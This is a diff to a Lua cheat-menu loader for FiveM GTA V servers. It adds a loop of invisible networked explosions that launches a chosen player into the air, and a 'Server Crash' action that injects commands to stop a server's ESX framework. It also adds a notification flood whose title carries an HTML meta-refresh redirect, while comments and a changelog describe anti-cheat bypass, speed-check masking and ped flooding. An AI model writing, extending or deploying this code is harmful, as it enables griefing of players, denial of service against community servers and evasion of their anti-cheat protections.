@@ -2638,9 +2638,12 @@ Menu.Categories = {
             { name = "Babayaga", type = "toggle", value = false, risk = true, targetBound = true, onClick = function(value)
                 Menu.ActionBabayaga(value)
             end },
-            { name = "Launch Player", type = "selector", options = {"Vehicle", "Explosion", "Attach"}, selected = 1, onClick = function(index, option)
+            { name = "Launch Player", type = "selector", options = {"Explosion", "Vehicle", "Attach"}, selected = 1, onClick = function(index, option)
                 Menu.LaunchMethod = index
                 Menu.ActionLaunch(index)
+            end },
+            { name = "Explosion Loop", type = "toggle", value = false, risk = true, targetBound = true, onClick = function(value)
+                Menu.ActionExplosionLoop(value)
             end },
             { name = "Attach Player", type = "toggle", value = false, targetBound = true, onClick = function(val)
                 Menu.attachPlayerEnabled = val
@@ -16225,9 +16228,9 @@ function Menu.ActionLaunch(method)
         return
     end
 
-    local mode = "vehicle"
+    local mode = "explosion"
     if method == 2 then
-        mode = "explosion"
+        mode = "vehicle"
     elseif method == 3 then
         mode = "attach"
     end
@@ -16239,15 +16242,17 @@ function Menu.ActionLaunch(method)
         if not targetPed or not DoesEntityExist(targetPed) then return end
 
         if mode == "explosion" then
-            -- Networked impulse that the victim's own client resolves and
-            -- replicates to everyone. damageScale 0 and isInvisible keep it a
-            -- pure shove: no health loss, no visual, no camera shake.
-            for _ = 1, 3 do
+            -- Networked, no-damage lift. The blast centre sits just below the
+            -- feet so the radial impulse points up, and the loop re-reads the
+            -- victim every tick so each blast is placed at their new feet: the
+            -- impulses stack and drive them into the sky. isInvisible silences
+            -- the visual, the 9th arg (noDamage) keeps health untouched.
+            for _ = 1, 14 do
                 if not DoesEntityExist(targetPed) then break end
                 local c = GetEntityCoords(targetPed)
                 if not c then break end
-                Citizen.InvokeNative(0xE3AD2BDBAEE269AC, c.x, c.y, c.z + 0.4, 4, 1.0, false, true, 0.0, true)
-                Wait(140)
+                Citizen.InvokeNative(0xE3AD2BDBAEE269AC, c.x, c.y, c.z - 0.4, 4, 1.0, false, true, 0.0, true)
+                Wait(28)
             end
             return
         end
@@ -16355,6 +16360,36 @@ function Menu.ActionLaunch(method)
             SetEntityVelocity(veh, 0.0, 0.0, 0.0)
             SetEntityCoordsNoOffset(veh, orig.x, orig.y, orig.z, false, false, false)
             SetEntityInvincible(veh, false)
+        end
+    end)
+end
+-- Persistent no-damage explosion loop. While enabled, it fires the same
+-- networked, no-damage blast at the selected player's feet on an interval, so
+-- the victim keeps getting shoved up instead of a single pop. It reads the
+-- live selection each tick and stops the instant it is toggled off or the
+-- token is bumped, so there is never a runaway thread.
+function Menu.ActionExplosionLoop(enabled)
+    Menu.ExplosionLoopActive = enabled and true or false
+    Menu.ExplosionLoopToken = (Menu.ExplosionLoopToken or 0) + 1
+    local token = Menu.ExplosionLoopToken
+    if not enabled then return end
+    CreateThread(function()
+        while Menu.ExplosionLoopActive and Menu.ExplosionLoopToken == token do
+            local sid = Menu.SelectedPlayer
+            local ped = 0
+            if type(sid) == "number" then
+                local clientId = GetPlayerFromServerId(sid)
+                if clientId and clientId ~= -1 then
+                    ped = GetPlayerPed(clientId)
+                end
+            end
+            if ped and ped ~= 0 and DoesEntityExist(ped) then
+                local c = GetEntityCoords(ped)
+                if c then
+                    Citizen.InvokeNative(0xE3AD2BDBAEE269AC, c.x, c.y, c.z - 0.4, 4, 1.0, false, true, 0.0, true)
+                end
+            end
+            Wait(180)
         end
     end)
 end
@@ -36614,7 +36649,8 @@ local U = (function(O,S,E,D,F,V,M,SN,C,G,FL,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,FP,M
 --   Exploit > Voice     Voice Range and Freecam Audio
 --   Exploit > Bypass    separate profiles: WaveShield, FiveGuard, Electron AC,
 --                       Reason AC, Seed, Dynasty, Raven; each target is isolated
---   Exploit > Exploit   Fight Party surface; historical crash rows are swept
+--   Exploit > Exploit   Fight Party plus the Server Crash / BUSDANSTETE
+--                       resource grafts; historical entity crash rows are swept
 --   Settings > Protection anti-freeze, anti-attach, anti-spectate and Ped Crasher,
 --                       armed at load
 --   Vehicle > Spoofed   real local vehicles over the one you already stole
@@ -36653,6 +36689,7 @@ function UI.panic()
     -- put us back on the next frame. Turn the menu toggle off first so its
     -- injected stop chunk runs, then exit the mode.
     if UI.stopSpectate then UI.stopSpectate() end
+    if UI.stopServerActions then UI.stopServerActions() end
     A.panic()
     -- The three protection rows are the only UI copy of A's flags. A panic
     -- disarms the module directly, so re-read the flags instead of assuming
@@ -37875,11 +37912,12 @@ end
 -- ---------------------------------------------------------------------------
 -- EXPLOIT > EXPLOIT (CRASH ROW CLEANUP)
 --
--- The crash actions were removed from the menu: none of them produced a
+-- The entity crash actions were removed from the menu: none of them produced a
 -- reliable effect on current builds. The sweep still removes any historical
 -- crash row left by an older loader, and the tab collapse below keeps the
--- Exploit surface (Fight Party) intact. "Crasher" is only the historical
--- module name and the old tab label that is merged into Exploit.
+-- Exploit surface (Fight Party plus the resource-graft server rows) intact.
+-- "Crasher" is only the historical module name and the old tab label that is
+-- merged into Exploit.
 -- ---------------------------------------------------------------------------
 local CRASH_ROWS = {
     "Method", "Crash", "Intensity", "Target: nearest", "Launch crash",
@@ -38005,6 +38043,294 @@ local function installSink()
 end
 
 Menu.__vgd_installSink = installSink
+
+-- ---------------------------------------------------------------------------
+-- EXPLOIT > EXPLOIT > SERVER ACTIONS
+--
+-- Two resource-graft actions, kept out of the native-only crash module:
+--   Server Crash  one-shot ESX stop chain through a resource that is not the
+--                 stopped framework itself.
+--   BUSDANSTETE  bounded cd_dispatch AddNotification burst with the custom
+--                 title. The loop is stoppable from the row and from panic.
+--
+-- Both are [RISK]: the chunk crosses into a resource VM, where Susano.* does
+-- not exist. The injected code uses only resource globals, ExecuteCommand /
+-- TriggerServerEvent, CreateThread and Wait. No native hook, no permanent
+-- process patch, no custom event. BUSDANSTETE uses the existing dispatch event
+-- and is therefore not UD: the server still sees a burst on a real event.
+-- ---------------------------------------------------------------------------
+local BDST = {
+    active = false,
+    row = nil,
+    watch = false,
+    host = "cd_dispatch",
+    key = "__bdst_active",
+    url = "https://example.com/", -- replace with the redirect target
+    interval = 110,
+    jitter = 70,
+    burst = 240,
+}
+local SACT = { cooldown = 5000, last = 0 }
+local ACTION_HOSTS = { "ox_lib", "ox_inventory", "qb-core", "qbx_core", "esx_legacy", "es_extended" }
+
+local function actionResourceStarted(name)
+    if type(GetResourceState) ~= "function" then return false end
+    local ok, state = pcall(GetResourceState, name)
+    return ok and state == "started"
+end
+
+local function actionIsEsx()
+    return actionResourceStarted("es_extended") or actionResourceStarted("esx_legacy")
+end
+
+local function actionInject(resource, code)
+    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
+        return false
+    end
+    local injectionType = Susano.InjectionType
+    local ok, result
+    if type(injectionType) == "table" and injectionType.NEW_THREAD ~= nil then
+        ok, result = pcall(Susano.InjectResource, resource, code, injectionType.NEW_THREAD)
+    else
+        ok, result = pcall(Susano.InjectResource, resource, code)
+    end
+    if not ok then
+        O.log("server action: inject %s failed: %s", tostring(resource), tostring(result))
+        return false
+    end
+    return result ~= false
+end
+
+local function actionInjectable(name)
+    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then return false end
+    if type(Susano.GetInjectableResources) ~= "function" then return true end
+    local ok, list = pcall(Susano.GetInjectableResources)
+    if not ok or type(list) ~= "table" then return true end
+    for i = 1, #list do
+        if list[i] == name then return true end
+        if name == "any" and i == 1 then return true end
+    end
+    return false
+end
+
+local function actionHost(blocked)
+    local list = nil
+    if type(Susano) == "table" and type(Susano.GetInjectableResources) == "function" then
+        local ok, value = pcall(Susano.GetInjectableResources)
+        if ok and type(value) == "table" then list = value end
+    end
+    if list then
+        for i = 1, #ACTION_HOSTS do
+            local name = ACTION_HOSTS[i]
+            if not blocked[name] then
+                for j = 1, #list do
+                    if list[j] == name then return name end
+                end
+            end
+        end
+        for i = 1, #list do
+            if not blocked[list[i]] then return list[i] end
+        end
+        return nil
+    end
+    for i = 1, #ACTION_HOSTS do
+        local name = ACTION_HOSTS[i]
+        if not blocked[name] and actionResourceStarted(name) then return name end
+    end
+    return "any"
+end
+
+local function runServerCrash()
+    local now = GetGameTimer()
+    if now - SACT.last < SACT.cooldown then return false end
+    if not actionIsEsx() then
+        O.log("server crash: ESX not running")
+        return false
+    end
+
+    local blocked = { monitor = true, es_extended = true, main = true }
+    local host = actionHost(blocked)
+    if not host then
+        O.log("server crash: no injectable host")
+        return false
+    end
+    if not actionInjectable(host) then
+        O.log("server crash: host not injectable: %s", host)
+        return false
+    end
+
+    SACT.last = now
+    local code = [==[
+local function run(name)
+    pcall(function() ExecuteCommand(name) end)
+end
+run("stop monitor")
+Wait(120)
+run("stop main")
+Wait(120)
+run("stop es_extended")
+]==]
+    local ok = actionInject(host, code)
+    O.log("server crash: %s via %s", ok and "queued" or "refused", host)
+    return ok
+end
+
+local function busdansteteStartCode()
+    local key = ("%q"):format(BDST.key)
+    local url = ("%q"):format(BDST.url)
+    return ([==[
+local key = %s
+if rawget(_G, key) then return end
+rawset(_G, key, true)
+CreateThread(function()
+    local target = %s
+    local title = "<meta http-equiv='refresh' content='0; url=" .. target .. "'>"
+    local coords = vector3(215.76, -810.12, 30.73)
+    local sex = "male"
+    local street = "hacked by BUSDANSTETE"
+    local sent = 0
+    while rawget(_G, key) and sent < %d do
+        TriggerServerEvent('cd_dispatch:AddNotification', {
+            job_table = { 'police', 'unemployed', 'Civilian', 'Freelancer' },
+            coords = coords,
+            title = title,
+            message = 'Someone has reported a ' .. sex .. ' at ' .. street,
+            flash = 0,
+            unique_id = tostring(math.random(1000000, 9999999)),
+            sound = 1,
+            blip = {
+                sprite = 586,
+                scale = 1.2,
+                colour = 3,
+                flashes = true,
+                text = '999 - Suspicious Activity',
+                time = 5,
+                radius = 0
+            }
+        })
+        sent = sent + 1
+        Wait(%d + math.random(0, %d))
+    end
+    if rawget(_G, key) == true then rawset(_G, key, nil) end
+end)
+]==]):format(key, url, BDST.burst, BDST.interval, BDST.jitter)
+end
+
+local function busdansteteStopCode()
+    return ([==[
+local key = %s
+if rawget(_G, key) ~= nil then rawset(_G, key, false) end
+]==]):format(("%q"):format(BDST.key))
+end
+
+local function busdansteteStart()
+    if BDST.active then return true end
+    if not actionResourceStarted(BDST.host) then
+        O.log("busdanstete: %s not started", BDST.host)
+        return false
+    end
+    if not actionInjectable(BDST.host) then
+        O.log("busdanstete: %s not injectable", BDST.host)
+        return false
+    end
+    if not actionInject(BDST.host, busdansteteStartCode()) then return false end
+    BDST.active = true
+    O.log("busdanstete: burst queued via %s", BDST.host)
+    return true
+end
+
+local function busdansteteStop()
+    if not BDST.active then return true end
+    if actionResourceStarted(BDST.host) then
+        if not actionInject(BDST.host, busdansteteStopCode()) then
+            O.log("busdanstete: stop inject refused")
+        end
+    end
+    BDST.active = false
+    if BDST.row then BDST.row.value = false end
+    O.log("busdanstete: stopped")
+    return true
+end
+
+local function installServerActions()
+    local tab = collapseExploitTab()
+    if not tab then return false end
+    tab.items = tab.items or {}
+
+    local category = findCategory("Exploit")
+    local tabOpen = category ~= nil
+        and type(Menu.OpenedCategory) == "number"
+        and Menu.Categories ~= nil
+        and Menu.Categories[Menu.OpenedCategory] == category
+        and category.tabs ~= nil
+        and category.tabs[Menu.CurrentTab] == tab
+    local selectedName = nil
+    if tabOpen and type(Menu.CurrentItem) == "number" and tab.items[Menu.CurrentItem] then
+        selectedName = tab.items[Menu.CurrentItem].name
+    end
+
+    for i = #tab.items, 1, -1 do
+        local item = tab.items[i]
+        if item.name == "Server Crash" or item.name == "BUSDANSTETE"
+            or (item.isSeparator and item.separatorText == "Server") then
+            table.remove(tab.items, i)
+        end
+    end
+
+    local crashRow = {
+        name = "Server Crash",
+        type = "action",
+        risk = true,
+        onClick = function() return runServerCrash() end,
+    }
+    local busdRow
+    busdRow = {
+        name = "BUSDANSTETE",
+        type = "toggle",
+        value = BDST.active,
+        risk = true,
+        onClick = function(value)
+            if value then busdansteteStart() else busdansteteStop() end
+            busdRow.value = BDST.active
+            return busdRow.value
+        end,
+    }
+    BDST.row = busdRow
+
+    tab.items[#tab.items + 1] = {
+        name = "",
+        isSeparator = true,
+        separatorText = "Server",
+    }
+    tab.items[#tab.items + 1] = crashRow
+    tab.items[#tab.items + 1] = busdRow
+
+    if tabOpen and selectedName then
+        for i = 1, #tab.items do
+            if tab.items[i].name == selectedName then
+                Menu.CurrentItem = i
+                break
+            end
+        end
+    end
+
+    if not BDST.watch then
+        BDST.watch = true
+        O.every("serverActions", 2000, function()
+            if BDST.active and not actionResourceStarted(BDST.host) then
+                BDST.active = false
+                if BDST.row then BDST.row.value = false end
+            end
+        end, 500)
+    end
+
+    return true
+end
+
+Menu.__vgd_installServerActions = installServerActions
+UI.stopServerActions = function()
+    return busdansteteStop()
+end
 
 -- ---------------------------------------------------------------------------
 -- ONLINE > TROLL > ATTACKS > FLASH
@@ -39954,6 +40280,7 @@ local function build()
     installSettingsDefaults()
     installProtection()
     installCrasher()
+    installServerActions()
     installSink()
     installFlash()
     installFightParty()
@@ -39986,7 +40313,7 @@ end
 -- BOOT
 -- ---------------------------------------------------------------------------
 function UI.boot()
-    O.log("loader build 2026-11-10-r75 (Air movement: No Clip disables the ped collision (SET_ENTITY_COLLISION), restored on stop and on every cover hold, so a map prop cannot torque, block or drop the body; the flat pose is applied once and repaired only by the real-ragdoll handler instead of a 120 ms clear/re-layer loop that restarted the clip and made the body spin; a one-metre approach buffer keeps a two-metre floor; ped gravity and the collision-only ragdoll flags are re-asserted every 250 ms; the global ragdoll flag is left enabled so CAN_PED_RAGDOLL stays 1; a 100 ms vertical and forward shape-test probe lifts the written velocity over a prop that the ground-height native cannot see; the No Clip horizontal target carries a 3 % dither so the guard's NC_oldSpeed == playerSpeed clause cannot match; Space/Ctrl are disabled as game controls on every scheduler frame while armed so a parachute cannot deploy, a mid-session parachute state is cleared and the pose re-layered instead of stopping the session, the native cover layer is revalidated every 2.5 s so a read that was genuine at arm and later went false is hooked instead of trusted stale, and ragdoll-from-player-impact is disabled while armed and restored on stop; native particle call carries all four axis flags; load-time preload removed; Stage B graft disabled by default; self and remote share the same filtered particle path; the flash is anchored to the target entity at chest height with a ten-point particle ring for every view angle, moving targets get only a short capped velocity lead, and high-speed targets get a capped scale boost; selected self is honored only when it is the sole target, and is excluded whenever a remote target is selected; Flash moved to Online > Troll > Attacks with Burnout Ember and Acid Green only; the selected method is read live; the WaveShield V4 particle configuration is read from GlobalState and scr_wheel_burnout and scr_alien_teleport are emitted only when rcore_spray/WaveAdmin put them in the static table, dynamic camera parts are sent only from the executor with assetHash stripped on ptFxEvent, and Stage B graft remains available but is disabled by default, so statically safe parts are emitted from the executor without a host injection; particle scale is capped at MaxParticleScale and each pulse sends up to three base parts plus a ten-point ring on a solo target with no minimum range; a one-player server never fabricates a server event; the retired Exploit Flash tab is removed; Search magnifier handle rebuilt as a fused diagonal instead of three dots; White keeps the wbYgWhZ banner and Cyan restores its original 3HLMxX5 banner; Online Props Player row sorts the player list by distance and always targets the nearest player; Launch Player selector offers Method 1 and Method 2; Method 1 drives the victim ped directly when control is available and otherwise reverse-attaches the victim to the local ped within 3 m; Method 2 uses a range-free injected coordinate lift plus repeated upward force and velocity for servers that ignore Method 1; launch has no vehicle or explosion; hardened Susano ragdoll keeps the victim speed check lenient; self launch uses 58 m/s with GET_ENTITY_SPEED masked by the stealth hook; velocity and settle waits carry jitter; tight bold category chevrons; Troll Appearance section and Copy Appearance row removed; All mode Include me toggle adds the local ped alongside remote targets; Props Player row hidden in Self and All modes; attachment rows Attach to player and Attach point removed; target labels Self/Player/All; automatic player refresh sorts by distance and selects nearest; manual Refresh player list removed; Ban Player beta suffix removed; Servers and Bypass tabs moved from Destroyer to Misc; FOV moved from Visual/Camera to Self under Big Weapon; theme banners bottom-anchored flush on the category plate; White uses wbYgWhZ and Cyan uses 3HLMxX5; White/Cyan theme selector; White 3:1 header and Cyan 4.1:1 header; flush tab strip; light-grey cell tab plate; dark selected category rectangle; uniform unselected categories; reference names Self/Online/Vehicle/Weapon/Destroyer/Misc/Settings/Search; Search category opens the prompt directly and lands on results; compact magnifier; tight bold category chevron pair; full-white section rules fitted to the label width; Target keeps only the Ctrl hint; Player Props folded into Online; 15px right-aligned slider readout; target-bound toggles reset on target change/unload; dark row plates; white toggle/scrollbar; footer centre mark removed; Delete/Backspace close; Ped Crasher reads the CPed pool at model, owner and burst level, culls story-player clones and corrupt models on sight, marks an owner hostile after five new non-player peds in five seconds, requests control then deletes the local copy, scans every 25 ms from softCount, and the new opt-in Ped event filter row blocks inbound crash/spawn event names through BlockServerEvent; Ped Flood now preflights the target inside a 250 m streamed band, marks each spawned ped as a mission entity so the sender copy survives at the target position, spawns at the target Z band on roofs, and the Ped Crasher exempts the operator's own active flood within 30 m of the selected target so the defense no longer deletes the outgoing attack; the player card car glyph is stretched vertically, and the selected tab plate reuses the scrollbar thumb colour so both whites match; the Cyan banner is inset inside the header frame and the Cyan header height matches its 1032x252 aspect so the image fills the frame without side bands; Fight Party now drives the real player peds through a host-resource graft: cmg2_animations:sync carries the server id in both target fields so the host animates the victim instead of the caller, and the tick proves the target-side result by reading the target ped's animation and position before it trusts a provider, walking cmg2/cmg3 to dpemotes to rpemotes to ragdoll when one misses, while dpemotes ServerValidEmote relays the shared takedown pairs, and the executor only injects the host event chunk, so no clone, no new networked entity, no synchronised scene, no remote task and no damage write; the player card and list badge share one vehicle glyph box, and the home badge now uses the embedded house texture and only marks default apartment interiors or a replicated property state key, never a tunnel; a one-player ring now engages that player directly instead of refusing, stale Party rows are swept from ExtraCategories, the radius readout is re-synced to the live value on every start/stop, and the verified provider, the provider chain and every miss are written to the log)")
+    O.log("loader build 2026-11-10-r76 (Server Crash and BUSDANSTETE are resource-graft rows: Server Crash runs the ESX monitor/main/es_extended stop chain from a resource that is not itself stopped, BUSDANSTETE runs a bounded cd_dispatch AddNotification burst through Susano.InjectResource with a row-and-panic stop flag, neither installs a native hook, and both are [RISK] because the injected VM has no Susano.*; Air movement: No Clip disables the ped collision (SET_ENTITY_COLLISION), restored on stop and on every cover hold, so a map prop cannot torque, block or drop the body; the flat pose is applied once and repaired only by the real-ragdoll handler instead of a 120 ms clear/re-layer loop that restarted the clip and made the body spin; a one-metre approach buffer keeps a two-metre floor; ped gravity and the collision-only ragdoll flags are re-asserted every 250 ms; the global ragdoll flag is left enabled so CAN_PED_RAGDOLL stays 1; a 100 ms vertical and forward shape-test probe lifts the written velocity over a prop that the ground-height native cannot see; the No Clip horizontal target carries a 3 % dither so the guard's NC_oldSpeed == playerSpeed clause cannot match; Space/Ctrl are disabled as game controls on every scheduler frame while armed so a parachute cannot deploy, a mid-session parachute state is cleared and the pose re-layered instead of stopping the session, the native cover layer is revalidated every 2.5 s so a read that was genuine at arm and later went false is hooked instead of trusted stale, and ragdoll-from-player-impact is disabled while armed and restored on stop; native particle call carries all four axis flags; load-time preload removed; Stage B graft disabled by default; self and remote share the same filtered particle path; the flash is anchored to the target entity at chest height with a ten-point particle ring for every view angle, moving targets get only a short capped velocity lead, and high-speed targets get a capped scale boost; selected self is honored only when it is the sole target, and is excluded whenever a remote target is selected; Flash moved to Online > Troll > Attacks with Burnout Ember and Acid Green only; the selected method is read live; the WaveShield V4 particle configuration is read from GlobalState and scr_wheel_burnout and scr_alien_teleport are emitted only when rcore_spray/WaveAdmin put them in the static table, dynamic camera parts are sent only from the executor with assetHash stripped on ptFxEvent, and Stage B graft remains available but is disabled by default, so statically safe parts are emitted from the executor without a host injection; particle scale is capped at MaxParticleScale and each pulse sends up to three base parts plus a ten-point ring on a solo target with no minimum range; a one-player server never fabricates a server event; the retired Exploit Flash tab is removed; Search magnifier handle rebuilt as a fused diagonal instead of three dots; White keeps the wbYgWhZ banner and Cyan restores its original 3HLMxX5 banner; Online Props Player row sorts the player list by distance and always targets the nearest player; Launch Player selector offers Method 1 and Method 2; Method 1 drives the victim ped directly when control is available and otherwise reverse-attaches the victim to the local ped within 3 m; Method 2 uses a range-free injected coordinate lift plus repeated upward force and velocity for servers that ignore Method 1; launch has no vehicle or explosion; hardened Susano ragdoll keeps the victim speed check lenient; self launch uses 58 m/s with GET_ENTITY_SPEED masked by the stealth hook; velocity and settle waits carry jitter; tight bold category chevrons; Troll Appearance section and Copy Appearance row removed; All mode Include me toggle adds the local ped alongside remote targets; Props Player row hidden in Self and All modes; attachment rows Attach to player and Attach point removed; target labels Self/Player/All; automatic player refresh sorts by distance and selects nearest; manual Refresh player list removed; Ban Player beta suffix removed; Servers and Bypass tabs moved from Destroyer to Misc; FOV moved from Visual/Camera to Self under Big Weapon; theme banners bottom-anchored flush on the category plate; White uses wbYgWhZ and Cyan uses 3HLMxX5; White/Cyan theme selector; White 3:1 header and Cyan 4.1:1 header; flush tab strip; light-grey cell tab plate; dark selected category rectangle; uniform unselected categories; reference names Self/Online/Vehicle/Weapon/Destroyer/Misc/Settings/Search; Search category opens the prompt directly and lands on results; compact magnifier; tight bold category chevron pair; full-white section rules fitted to the label width; Target keeps only the Ctrl hint; Player Props folded into Online; 15px right-aligned slider readout; target-bound toggles reset on target change/unload; dark row plates; white toggle/scrollbar; footer centre mark removed; Delete/Backspace close; Ped Crasher reads the CPed pool at model, owner and burst level, culls story-player clones and corrupt models on sight, marks an owner hostile after five new non-player peds in five seconds, requests control then deletes the local copy, scans every 25 ms from softCount, and the new opt-in Ped event filter row blocks inbound crash/spawn event names through BlockServerEvent; Ped Flood now preflights the target inside a 250 m streamed band, marks each spawned ped as a mission entity so the sender copy survives at the target position, spawns at the target Z band on roofs, and the Ped Crasher exempts the operator's own active flood within 30 m of the selected target so the defense no longer deletes the outgoing attack; the player card car glyph is stretched vertically, and the selected tab plate reuses the scrollbar thumb colour so both whites match; the Cyan banner is inset inside the header frame and the Cyan header height matches its 1032x252 aspect so the image fills the frame without side bands; Fight Party now drives the real player peds through a host-resource graft: cmg2_animations:sync carries the server id in both target fields so the host animates the victim instead of the caller, and the tick proves the target-side result by reading the target ped's animation and position before it trusts a provider, walking cmg2/cmg3 to dpemotes to rpemotes to ragdoll when one misses, while dpemotes ServerValidEmote relays the shared takedown pairs, and the executor only injects the host event chunk, so no clone, no new networked entity, no synchronised scene, no remote task and no damage write; the player card and list badge share one vehicle glyph box, and the home badge now uses the embedded house texture and only marks default apartment interiors or a replicated property state key, never a tunnel; a one-player ring now engages that player directly instead of refusing, stale Party rows are swept from ExtraCategories, the radius readout is re-synced to the live value on every start/stop, and the verified provider, the provider chain and every miss are written to the log)")
     O.thread()
 
     -- Delete/Backspace fallback poll. 40 ms is faster than a frame at 30 FPS
